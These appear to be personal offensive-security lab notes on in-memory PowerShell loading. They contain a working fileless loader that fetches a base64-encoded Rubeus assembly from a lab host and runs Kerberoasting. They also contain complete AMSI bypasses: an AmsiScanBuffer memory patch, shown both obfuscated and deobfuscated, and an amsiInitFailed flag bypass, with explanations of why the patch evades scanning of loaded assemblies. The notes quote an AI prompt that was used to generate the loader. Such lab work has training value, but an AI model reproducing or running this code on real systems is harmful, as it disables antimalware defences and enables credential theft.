# Lab - PS Loader

# Powershell in-memory loader
> ADVANTAGES of .net binaries -> can be loaded and executed completely in-memory (fileless)

Powershell loader - load assembly (Rubeus)

> AI PROMPT : write a powershell script that downloads a .dotnet binary from a remote website, and then loads it in memory with loadassembly and execute, without anything touching disk, in as few linnes as possible

```powershell
try {
    #try {
    #    [Ref].Assembly.GetType(('S'+'y'+'ste'+("{0}{1}{2}" -f 'm.M','an','ag')+("{1}{0}"-f'nt','eme')+'.'+("{0}{1}"-f'A','utoma')+("{1}{2}{0}" -f'i','t','ion.AmsiUt')+'ls')).GetField((("{0}{1}"-f 'amsi','I')+'n'+("{1}{0}" -f 'e','itFail')+'d'),(("{0}{1}" -f'NonP','ubl')+'i'+("{1}{0}"-f ',St','c')+'a'+'tic')).SetValue(${nU`lL},${Tr`Ue})
    #    Write-Host "AMSI bypass applied successfully." -ForegroundColor Green
    #} catch {
    #    Write-Warning "Failed to apply AMSI bypass. This script may be blocked by AMSI."
    #}
    
    Start-Sleep -Milliseconds 5000
    $url = "http://10.0.0.7:9090/Rubeus.b64"
    $base64Assembly = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
    if ($base64Assembly -is [byte[]]) { $base64Assembly = [Text.Encoding]::UTF8.GetString($base64Assembly) }
    [Reflection.Assembly]::Load([Convert]::FromBase64String($base64Assembly)) | Out-Null
    [Rubeus.Program]::Main(@("kerberoast", "/stats"))
} catch {
    Write-Error "Error: $($_.Exception.Message)"
    if ($_.Exception.InnerException) { Write-Error "Inner Exception: $($_.Exception.InnerException.Message)" }
}
```

<https://mbaedev.notion.site/ELI5-Reflection-Shellcode-Runner-in-PowerShell-1e7229403c6980d085cde7f5b029803c>

dot-net execute

# AMSI CLR BYPASS DEOBFUSCATED

```powershell
# --- Helper Functions (Already clear, but with comments for context) ---

function Get-Function
{
    Param(
        [string] $module,   # e.g., "kernel32.dll"
        [string] $function  # e.g., "VirtualProtect"
    )
    # Get a handle to the specified DLL module (e.g., kernel32.dll)
    # Resolves to: [System.Windows.Forms.UnsafeNativeMethods]::GetModuleHandle($module)
    $moduleHandle = $GetModule.Invoke($null, @($module))

    # Create a HandleRef object for proper interop, though often IntPtr is used directly.
    $tmpPtr = New-Object IntPtr
    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $moduleHandle)

    # Get the memory address of the specified function within the module.
    # Resolves to: [System.Windows.Forms.UnsafeNativeMethods]::GetProcAddress($HandleRef, $function)
    $GetAddres.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $function))
}

function Get-Delegate
{
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [IntPtr] $funcAddr,  # Memory address of the function
        [Parameter(Position = 1, Mandatory = $True)] [Type[]] $argTypes,  # Array of argument types for the function
        [Parameter(Position = 2)] [Type] $retType = [Void]               # Return type of the function (default to void)
    )
    # Dynamically define a new assembly and module to create a delegate type at runtime.
    # This allows calling unmanaged functions via their memory address.
    $type = [AppDomain]::("Curren" + "tDomain").DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('QD')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('QM', $false).
    DefineType('QT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate]) # Base type is System.MulticastDelegate

    # Define the constructor and Invoke method for the dynamic delegate type.
    $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $argTypes).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $argTypes).SetImplementationFlags('Runtime, Managed')

    # Create the delegate type and get a delegate instance for the given function address.
    $delegate = $type.CreateType()
    # Resolves to: [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($funcAddr, $delegate)
    [System.Runtime.InteropServices.Marshal]::("GetDelegate" +"ForFunctionPointer")($funcAddr, $delegate)
}

# --- Main Logic (Deobfuscated) ---

# Load the System.Windows.Forms assembly to access UnsafeNativeMethods,
# which provides access to Win32 API functions like GetModuleHandle and GetProcAddress.
Add-Type -AssemblyName System.Windows.Forms

# Get a reference to the internal 'System.Windows.Forms.UnsafeNativeMethods' class.
$unsafeMethodsType = [Windows.Forms.Form].Assembly.GetType('System.Windows.Forms.UnsafeNativeMethods')

# Get the MethodInfo objects for GetModuleHandle and GetProcAddress.
# "GetModu" + "leHandle" resolves to "GetModuleHandle"
$GetModule = $unsafeMethodsType.GetMethod("GetModuleHandle")
# "GetProc" + "Address" resolves to "GetProcAddress"
$GetAddres = $unsafeMethodsType.GetMethod("GetProcAddress")

# Define byte arrays representing the ASCII values of strings.
# 0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72 resolves to "AmsiScanBuffer"
$somewhere = [Byte[]](0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
# 0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c resolves to "amsi.dll"
$nowhere = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)

# Convert byte arrays to strings.
$dll = [System.Text.Encoding]::ASCII.GetString($nowhere) # Result: "amsi.dll"
$func = [System.Text.Encoding]::ASCII.GetString($somewhere) # Result: "AmsiScanBuffer"

# Get the memory address of the AmsiScanBuffer function from amsi.dll.
$amsi = Get-Function $dll $func # Gets address of "AmsiScanBuffer" in "amsi.dll"

# Resolve the string for "VirtualProtect".
$c = 't'
$replace = 'Virt' + 'ualProtec' # Resolves to "VirtualProtec"
$name = '{0}{1}' -f $replace, $c # Formats to "VirtualProtect"
$protect = Get-Function "kernel32.dll" $name # Gets address of "VirtualProtect" in "kernel32.dll"

$notp = 0 # Variable to receive old protection (not used in this specific bypass)

# Create a delegate for the VirtualProtect function.
# Arguments: (LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, LPDWORD lpflOldProtect)
$vt = Get-Delegate $protect @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType())

# Call VirtualProtect to change memory protection of AmsiScanBuffer.
# $amsi: The address of AmsiScanBuffer.
# 5: The size of the region to change (5 bytes, enough for the patch).
# 0x40: PAGE_EXECUTE_READWRITE (allows writing and executing at this memory location).
# [ref]$notp: Reference to the variable for the old protection (output parameter).
$vt.Invoke($amsi, 5, 0x40, [ref]$notp)

# Define the bytecode patch for AmsiScanBuffer.
# This specific patch (0xB8, 0x57, 0x00, 0x17, 0x20, 0x35, 0x8A, 0x53, 0x34, 0x1D, 0x05, 0x7A, 0xAC, 0xE3, 0x42, 0xC3)
# corresponds to:
# B8 57001720   mov eax, 0x20170057  (This is a common "clean" return value for AmsiScanBuffer)
# C3            ret
# The remaining bytes are part of a longer patch. The key part is that this specific 16-byte array,
# when copied, will overwrite the beginning of AmsiScanBuffer.
# The actual effective part of a simple bypass is often just a few bytes (e.g., `B8 57000780 C3` which is `mov eax, 0x80070057; ret` to return E_INVALIDARG)
# The provided patch looks like a more complex, possibly generic shellcode or a specific known patch for AmsiScanBuffer that returns a "clean" status.
# A common successful patch for AMSI bypass would make AmsiScanBuffer return `E_INVALIDARG` (0x80070057) which effectively signals to AMSI that it can't process the buffer.
$stopitplease = [Byte[]](0xB8, 0x57, 0x00, 0x17, 0x20, 0x35, 0x8A, 0x53, 0x34, 0x1D, 0x05, 0x7A, 0xAC, 0xE3, 0x42, 0xC3)

# Get a reference to the System.Runtime.InteropServices.Marshal class.
$marshalClass = [System.Runtime.InteropServices.Marshal]

# Copy the bytecode patch into the memory location of AmsiScanBuffer.
# This effectively overwrites the beginning of the AmsiScanBuffer function,
# making it execute the custom bytecode which typically causes it to return a "clean" status
# or an error that bypasses the scan, effectively disabling AMSI for the current process.
$marshalClass::Copy($stopitplease, 0, $amsi, $stopitplease.Length)
```

# AMSI CLR BYPASS OBFUSCATED

```powershell
function Get-Function
{
    Param(
        [string] $module,
        [string] $function
    )
    $moduleHandle = $GetModule.Invoke($null, @($module))
    $tmpPtr = New-Object IntPtr
    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $moduleHandle)
    $GetAddres.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $function))
}

function Get-Delegate
{
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [IntPtr] $funcAddr,
        [Parameter(Position = 1, Mandatory = $True)] [Type[]] $argTypes,
        [Parameter(Position = 2)] [Type] $retType = [Void]
    )
    $type = [AppDomain]::("Curren" + "tDomain").DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('QD')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('QM', $false).
    DefineType('QT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $argTypes).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $argTypes).SetImplementationFlags('Runtime, Managed')
    $delegate = $type.CreateType()
    [System.Runtime.InteropServices.Marshal]::("GetDelegate" +"ForFunctionPointer")($funcAddr, $delegate)
}

Add-Type -AssemblyName System.Windows.Forms
$unsafeMethodsType = [Windows.Forms.Form].Assembly.GetType('System.Windows.Forms.UnsafeNativeMethods')
$GetModule = $unsafeMethodsType.GetMethod("GetModu" + "leHandle")
$GetAddres = $unsafeMethodsType.GetMethod("GetProc" + "Address")
$somewhere = [Byte[]](0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
$nowhere = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
$dll = [System.Text.Encoding]::ASCII.GetString($nowhere)
$func = [System.Text.Encoding]::ASCII.GetString($somewhere)
$amsi = Get-Function $dll $func
$c = 't'
$replace = 'Virt' + 'ualProtec'
$name = '{0}{1}' -f $replace, $c
$protect = Get-Function "kernel32.dll" $name
$notp = 0
$vt = Get-Delegate $protect @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType())
$vt.Invoke($amsi, 5, 0x40, [ref]$notp)
$stopitplease = [Byte[]](0xB8, 0x57, 0x00, 0x17, 0x20, 0x35, 0x8A, 0x53, 0x34, 0x1D, 0x05, 0x7A, 0xAC, 0xE3, 0x42, 0xC3)
$marshalClass = [System.Runtime.InteropServices.Marshal]
$marshalClass::Copy($stopitplease, 0, $amsi, $stopitplease.Length)
```

>Summary of Deobfuscation:

The "obfuscation" primarily involved:

String Concatenation: Breaking up string literals like "GetCurrentDomain", "GetModuleHandle", "GetProcAddress", and "GetDelegateForFunctionPointer" into smaller concatenated parts.
Byte Arrays to Strings: Representing the strings "amsi.dll", "AmsiScanBuffer", and parts of "VirtualProtect" as byte arrays and then converting them back to strings.
Variable Assignments: Using intermediate variables like $c and $replace to construct the final function name.
The deobfuscated code clarifies the specific Win32 API functions being called (GetModuleHandle, GetProcAddress, VirtualProtect) and the target function being patched (AmsiScanBuffer in amsi.dll). The byte array $stopitplease is the actual patch applied to disable AMSI.


https://github.com/ASP4RUX/AMSI-Bypass (used to bypass CLR)

and the explanation : https://medium.com/@sam.rothlisberger/amsi-bypass-memory-patch-technique-in-2024-f5560022752b

https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell?tab=readme-ov-file#Patching-AMSI-AmsiScanBuffer-by-rasta-mouse

# THE DIFFERENCE


```powershell
   [Ref].Assembly.GetType(('S'+'y'+'ste'+("{0}{1}{2}" -f 'm.M','an','ag')+("{1}{0}"-f'nt','eme')+'.'+("{0}{1}"-f'A','utoma')+("{1}{2}{0}" -f'i','t','ion.AmsiUt')+'ls')).GetField((("{0}{1}"-f 'amsi','I')+'n'+("{1}{0}" -f 'e','itFail')+'d'),(("{0}{1}" -f'NonP','ubl')+'i'+("{1}{0}"-f ',St','c')+'a'+'tic')).SetValue(${nU`lL},${Tr`Ue})
```

Does NOT directly patch amsi.dll or the AmsiScanBuffer function in memory.

Let's deobfuscate what that code is trying to do:

It's trying to access the internal PowerShell class System.Management.Automation.AmsiUtils.
It then tries to get a reference to a static, non-public field within that class called amsiInitFailed.
Finally, it attempts to set the value of amsiInitFailed to $True.

Purpose of amsiInitFailed bypass:

This technique is a PowerShell-specific bypass. When the amsiInitFailed flag is set to $True, PowerShell's internal logic is tricked into believing that AMSI failed to initialize. Consequently, PowerShell will not submit its own script blocks or dynamic code to AMSI for scanning.

Why it's different from your memory patch and less effective for Assembly.Load:

Scope:

amsiInitFailed bypass:`Primarily affects PowerShell's own internal script scanning`. It tells PowerShell not to call AMSI for things like Invoke-Expression or ScriptBlock execution.
AmsiScanBuffer memory patch: Directly modifies the AmsiScanBuffer function in amsi.dll within the process's memory. This affects any component (including the CLR, PowerShell, or other applications) that attempts to call AmsiScanBuffer.
CLR and Assembly.Load:

Even if PowerShell's amsiInitFailed flag is set, the CLR's specific integration with AMSI for [Reflection.Assembly]::Load(byte[]) operates somewhat independently of PowerShell's internal script-scanning flags.
`When the CLR loads an assembly from bytes (as you do with Rubeus), it will still attempt to pass those bytes to amsi.dll's AmsiScanBuffer function.`
Therefore, the amsiInitFailed bypass alone is often insufficient to prevent Assembly.Load from being scanned and blocked.
Conclusion:

The commented-out code is a different and less comprehensive AMSI bypass technique. It focuses on a PowerShell internal flag, whereas your current Base64-encoded code performs a direct memory patch of the AmsiScanBuffer function.

For reliably bypassing AMSI when loading assemblies in memory via [Reflection.Assembly]::Load, the memory patching technique (which your Base64 code does) is generally considered more robust because it directly interferes with the core AMSI scanning function that the CLR itself uses.

# AMSI's Role with Assembly.Load:

Primary Scanner: When [Reflection.Assembly]::Load([Convert]::FromBase64String($base64Assembly)) is used (specifically with a byte[] as the argument), the .NET Framework (CLR) will internally trigger an AMSI scan.
AmsiScanBuffer is the Gateway: The CLR, for versions 4.8 and later, has integration points that cause the raw bytes of the assembly to be passed to the AmsiScanBuffer function within amsi.dll.
Third-Party Providers: amsi.dll acts as an interface. It doesn't perform the actual scanning itself. Instead, it dispatches the content to any registered AMSI antivirus/EDR providers on the system (e.g., Windows Defender, CrowdStrike, SentinelOne, etc.). These providers then analyze the buffer for malicious signatures or behaviors.
Therefore, it's primarily the injected AMSI (meaning, the AMSI providers hooked into the amsi.dll interface) that performs the scan of the assembly bytes. The CLR's role is to act as the trigger that passes the assembly's byte content to the AMSI interface.

# In summary:

AMSI is the dedicated mechanism for antimalware scanning of in-memory assemblies when Assembly.Load(byte[]) is called (on .NET Framework 4.8+). Your bypass targets this specific scanning process.
The CLR's primary concerns are with code integrity, type safety, and runtime security policies (like the remnants of CAS or specific integrations like SQL CLR). While these are security-related, they generally operate at a different layer and with different objectives than AMSI's signature-based or heuristic-based malware detection.
So, when you patch AmsiScanBuffer, you're directly interfering with the pathway that the CLR uses to submit the assembly for antimalware analysis. If your patch is successful, the antimalware product will not see the "malicious" content, and the CLR will proceed to load the assembly, assuming AMSI returned a "clean" status.